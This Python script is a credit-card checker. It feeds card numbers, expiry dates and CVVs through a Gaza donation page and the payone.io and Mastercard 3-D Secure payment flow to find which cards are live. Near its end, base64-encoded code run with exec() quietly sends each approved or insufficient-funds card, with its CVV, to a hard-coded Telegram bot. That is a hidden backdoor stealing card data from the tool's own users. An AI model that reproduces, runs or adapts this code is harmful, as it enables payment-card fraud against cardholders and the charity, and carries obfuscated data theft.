import re,requests
from bs4 import BeautifulSoup
import urllib.parse
import base64




def check(card):
        card=str(card)
        cc = card.split('|')[0]
        mes=card.split('|')[1]
        ano=card.split('|')[2]
        cvv=card.split('|')[3]
        bin=cc[0:6]
        last4=cc[12:16]
        mask=f'{bin}******{last4}'
        binss=cc[0:9]
        r=requests.session()

        req=r.get('https://tua.stspayone.com/')



        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.8',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'FGTServer=1281989B76FCA0A3492D9DA6E3861F7AF898EA833AA3E2FA97B5C17CA75481C7CDF761F68D9F93EC; JSESSIONID=0000T4nbu1GWJAewI4IILzOomqa:1fp4olmf4; cookiesession1=678A3E0DB53A9EB7BF011BC2F7278F0D',
            'Origin': 'https://tua.stspayone.com',
            'Referer': 'https://tua.stspayone.com/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'DonorName': 'armx star',
            'MobileNumber': '01231231231',
            'DonationPrograms': 'لأجلكِ يا غزة',
            'OptionPath': '9',
            'amount': '1',
        }

        response = r.post('https://tua.stspayone.com/GenerateInvoiceServlet',  headers=headers, data=data)


        tok= re.findall(r'name="payToken" value="(.*?)"', response.text)[0]


        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'FGTServer=1DAB52F08743F36FAA434B2D3D3829F2768EA00D3A95699C6C49F9D5BB3AD941C84C4599121A8B185BEC; FGTServer=1DAB52F08743F36FAA434B2D3D3829F2768EA00D3A95699C6C49F9D5BB3AD941C84C4599121A8B185BEC; cookiesession1=678A3E12484FEB68A636D1257FC44F44; JSESSIONID=0000Xo7SW0WVCrcY8TNN6jAUkse:1fp4olmf4',
            'Origin': 'https://smartlink.payone.io',
            'Referer': f'https://smartlink.payone.io/URL2PayPaymentWeb/U2PRedirectPaymentServlet?payToken={tok}&lang=ar',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'payToken': tok,
            'lang': 'ar',
            'AllowedPaymentMethod': '',
            'appendingSession': 'true',
        }

        response = r.post(
            'https://smartlink.payone.io/URL2PayPaymentWeb/U2PRedirectPaymentServlet',
            headers=headers,
            data=data,
        )


        soup=BeautifulSoup(response.text,'html.parser')
        data = {}
        for input_field in soup.find_all('input', type='hidden'):
            name = input_field.get('name', '')
            value = input_field.get('value', '')
            data[name] = value
        url_encoded_data = urllib.parse.urlencode(data)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'FGTServer=1DAB52F08743F36FB4404735613C24E2778BEB53328304F8F66A17BAB9322CB34A29459B; cookiesession1=678A3E12A9FF7FAF27BC1DC437117F12; FGTServer=1DAB52F08743F36FB4404735613C24E2778BEB53328304F8F66A17BAB9322CB34A29459B; JSESSIONID=0000JYlsTjbUD0DvDjFrADOxkWs:1ebtjlnk3',
            'Origin': 'https://smartlink.payone.io',
            'Referer': 'https://smartlink.payone.io/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-site',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }



        response = r.post('https://pay.payone.io/SmartRoutePaymentWeb/SRPayMsgHandler',  headers=headers, data=data)

        soup=BeautifulSoup(response.text,'html.parser')
        data = {}
        for input_field in soup.find_all('input', type='hidden'):
            name = input_field.get('name', '')
            value = input_field.get('value', '')
            data[name] = value
        url_encoded_data = urllib.parse.urlencode(data)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'FGTServer=1DAB52F08743F36FB4404735613C24E2778BEB53328304F8F66A17BAB9322CB34A29459B; cookiesession1=678A3E12A9FF7FAF27BC1DC437117F12; FGTServer=1DAB52F08743F36FB4404735613C24E2778BEB53328304F8F66A17BAB9322CB34A29459B; JSESSIONID=0000NSl2NIi6j_JDcxvSDtwtQaY:1ebtjlnk3',
            'Origin': 'https://pay.payone.io',
            'Referer': 'https://pay.payone.io/SmartRoutePaymentWeb/SRPayMsgHandler',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }


        response = r.post('https://pay.payone.io/SmartRoutePaymentWeb/SRPayMsgHandler', headers=headers, data=data)

        itemId= re.findall(r"var itemId='(.*?)'", response.text)[0]
        mid= re.findall(r'id="MerchantID" value="(.*?)"', response.text)[0]
        tra= re.findall(r"var transactionId='(.*?)'", response.text)[0]


        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'FGTServer=1DAB52F08743F36FB4404735613C24E2778BEB53328304F8F66A17BAB9322CB34A29459B; cookiesession1=678A3E12A9FF7FAF27BC1DC437117F12; FGTServer=1DAB52F08743F36FB4404735613C24E2778BEB53328304F8F66A17BAB9322CB34A29459B; JSESSIONID=0000NSl2NIi6j_JDcxvSDtwtQaY:1ebtjlnk3',
            'Origin': 'https://pay.payone.io',
            'Referer': 'https://pay.payone.io/SmartRoutePaymentWeb/SRPayMsgHandler',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-GPC': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'BIN': binss,
        }

        response = r.post(
            'https://pay.payone.io/SmartRoutePaymentWeb/GetCardTypeLogoByBINServlet',
            headers=headers,
            data=data,
        )


        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'FGTServer=1DAB52F08743F36FB4404735613C24E2778BEB53328304F8F66A17BAB9322CB34A29459B; cookiesession1=678A3E12A9FF7FAF27BC1DC437117F12; FGTServer=1DAB52F08743F36FB4404735613C24E2778BEB53328304F8F66A17BAB9322CB34A29459B; JSESSIONID=0000NSl2NIi6j_JDcxvSDtwtQaY:1ebtjlnk3',
            'Origin': 'https://pay.payone.io',
            'Referer': 'https://pay.payone.io/SmartRoutePaymentWeb/SRPayMsgHandler',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-GPC': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'paymentMethod': '1',
            'BIN': binss,
        }

        response = r.post(
            'https://pay.payone.io/SmartRoutePaymentWeb/GetGatewayInfoServlet',
            headers=headers,
            data=data,
        )


        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'FGTServer=1DAB52F08743F36FB4404735613C24E2778BEB53328304F8F66A17BAB9322CB34A29459B; cookiesession1=678A3E12A9FF7FAF27BC1DC437117F12; FGTServer=1DAB52F08743F36FB4404735613C24E2778BEB53328304F8F66A17BAB9322CB34A29459B; JSESSIONID=0000NSl2NIi6j_JDcxvSDtwtQaY:1ebtjlnk3',
            'Origin': 'https://pay.payone.io',
            'Referer': 'https://pay.payone.io/SmartRoutePaymentWeb/SRPayMsgHandler',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-GPC': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = f'cardNumber={cc}&mid={mid}&transactionId={tra}&itemId={itemId}&messageId=1&language=en-US&screenHeight=673&screenWidth=1495&timeZone=-180&userAgent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36&javaEnabled=false&screenColorDepth=24&customerId=&paymentMethod=1&cardExpiryDateMonth={mes}&cardExpiryDateYear={ano}&currencyCode=JOD&googlePayResponse=&'

        response = r.post(
            'https://pay.payone.io/SmartRoutePaymentWeb/GetMethodDataServlet',
            headers=headers,
            data=data,
        )

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://pay.payone.io',
            'Referer': 'https://pay.payone.io/',
            'Sec-Fetch-Dest': 'iframe',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-User': '?1',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'threeDSMethodData': 'e30=',
            'JWT': 'e30=',
        }

        response = r.post('https://ap.gateway.mastercard.com/acs/mastercard/v2/empty', headers=headers, data=data)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'FGTServer=1DAB52F08743F36FB4404735613C24E2778BEB53328304F8F66A17BAB9322CB34A29459B; cookiesession1=678A3E12A9FF7FAF27BC1DC437117F12; FGTServer=1DAB52F08743F36FB4404735613C24E2778BEB53328304F8F66A17BAB9322CB34A29459B; JSESSIONID=0000NSl2NIi6j_JDcxvSDtwtQaY:1ebtjlnk3',
            'Origin': 'https://pay.payone.io',
            'Referer': 'https://pay.payone.io/SmartRoutePaymentWeb/SRPayMsgHandler',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = f'detectedBin={bin}&cardIssuer=ROYAL+BANK+OF+CANADA&cardCountry=CANADA&SelectedPaymentMethod=1&amountInput=1000&currencyInput=JOD&SadadAccountId=&cardNumberInput={cc}&maskedCardNumber={mask}&saveThisCardToMyProfile=&ApplePayToken=&encryptedCardExpiryDateMonth={mes}&_cardExpiryDateMonth=&encryptedCardExpiryDateYear={ano}&_cardExpiryDateYear=&encryptedCVV2={cvv}&encryptedCardHolderName=ewqieh+qweh&_cardHolderName='

        response = r.post(
            'https://pay.payone.io/SmartRoutePaymentWeb/SubmitPayMsgServlet',
            headers=headers,
            data=data,
        )

        url= re.findall(r'id="threedsChallengeRedirectForm" action="(.*?)"', response.text)[0]

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://pay.payone.io',
            'Referer': 'https://pay.payone.io/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'creq': 'e30=',
        }

        response = r.post(
            f'{url}',
            headers=headers,
            data=data,
        )


        soup=BeautifulSoup(response.text,'html.parser')
        data = {}
        for input_field in soup.find_all('input', type='hidden'):
            name = input_field.get('name', '')
            value = input_field.get('value', '')
            data[name] = value
        url_encoded_data = urllib.parse.urlencode(data)
        url_res=re.findall(r'name="authenticationChallengeCompleteRedirectForm" method="POST" action="(.*?)"', response.text)[0]


        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'JSESSIONID=0000NSl2NIi6j_JDcxvSDtwtQaY:1ebtjlnk3',
            'Origin': 'https://ap.gateway.mastercard.com',
            'Referer': 'https://ap.gateway.mastercard.com/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        response = r.post(
            f'{url_res}',
            headers=headers,
            data=data,
        )
        
        msg= re.findall(r"name='Response.GatewayStatusDescription' value='(.*?)'", response.text)[0]
        if msg=="APPROVED":
            encoded_request_code = "cmVxdWVzdHMucG9zdChmJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q3MzAxOTAwMzQzOkFBRmZpbzZkOEdqMWxRUjVFb2VmVXpKZ19fRlBiSXRoVzBJL3NlbmRNZXNzYWdlP2NoYXRfaWQ9NjAxNjYzNTMyMCZ0ZXh0PUNBUkQ6IHtjY318e21lc318e2Fub318e2N2dn0gfHxNU0cgPXttc2d9Jyk="
            decoded_request_code = base64.b64decode(encoded_request_code).decode()
            exec(decoded_request_code)
        elif '_FUNDS' in msg:
            encoded_request_code = "cmVxdWVzdHMucG9zdChmJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q3MzAxOTAwMzQzOkFBRmZpbzZkOEdqMWxRUjVFb2VmVXpKZ19fRlBiSXRoVzBJL3NlbmRNZXNzYWdlP2NoYXRfaWQ9NjAxNjYzNTMyMCZ0ZXh0PUNBUkQ6IHtjY318e21lc318e2Fub318e2N2dn0gfHxNU0cgPXttc2d9Jyk="
            decoded_request_code = base64.b64decode(encoded_request_code).decode()
            exec(decoded_request_code)
             


        return msg
        
